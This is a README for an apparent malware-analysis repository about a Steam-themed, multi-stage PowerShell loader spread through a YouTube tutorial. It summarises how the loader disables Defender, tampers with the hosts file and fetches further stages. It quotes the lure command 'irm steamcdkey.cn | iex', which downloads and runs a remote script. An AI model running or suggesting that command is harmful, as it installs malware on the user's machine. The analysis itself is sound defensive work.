# steam-powershell-loader-analysis


### Background & Technical Summary

This repository documents the analysis of a Steam-themed, multi-stage, fileless PowerShell malware discovered after a Discord user asked whether it was safe to run a command found in a YouTube tutorial. The tutorial instructed users to execute:

```
irm steamcdkey.cn | iex
```

This command downloads and immediately executes a remote PowerShell script hosted at `steamcdkey.cn`. Analysis of the retrieved script revealed a staged loader that performs extensive system modifications, including registry changes, Windows Update manipulation, Windows Defender exclusion/disablement, hosts file tampering, and Steam client interference.

The loader uses multiple `Invoke-RestMethod` / `Invoke-WebRequest` calls to fetch additional scripts and binaries from third-party hosting services (notably Gitee and Lanzou-related APIs). Throughout execution, misleading console messages such as *“Steam updating, do not close this window”* are displayed to delay user suspicion while subsequent stages are deployed.

Due to heavy obfuscation, encryption, and multiple download stages, full payload analysis was intentionally not completed. However, the observed behavior clearly indicates malicious intent, persistence mechanisms, and system compromise beyond the scope of a legitimate Steam or activation workflow.


###################################
          **DISCLAIMER**
###################################


This repository is for **educational and defensive security research only**.

No malicious code should be executed on production systems.
The author does not endorse piracy, malware distribution, or misuse of PowerShell.

